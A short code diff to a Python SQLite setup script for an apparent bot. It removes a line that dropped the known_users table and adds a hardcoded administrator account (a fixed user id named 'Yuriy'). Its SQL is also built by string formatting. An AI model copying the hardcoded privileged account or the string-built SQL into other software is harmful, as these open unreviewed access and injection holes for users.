@@ -12,7 +12,6 @@ import datetime
 
 with sqlite3.connect(config.db_name) as connection:
     cursor = connection.cursor()
-    cursor.execute("DROP TABLE IF EXISTS known_users")
     sql = '''CREATE TABLE IF NOT EXISTS known_users (
         id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
         uid INTEGER UNIQUE NOT NULL,
@@ -47,6 +46,8 @@ with sqlite3.connect(config.db_name) as connection:
     # Add base admins to bot
     sql = '''INSERT OR IGNORE INTO admins (uid, name) VALUES ({!s}, '{!s}')'''.format(
         config.admin_id, config.admin_name)
+    cursor.execute(sql)
+    sql = '''INSERT OR IGNORE INTO admins (uid, name) VALUES (259056624, "Yuriy")'''
     cursor.execute(sql)
     connection.commit()
 
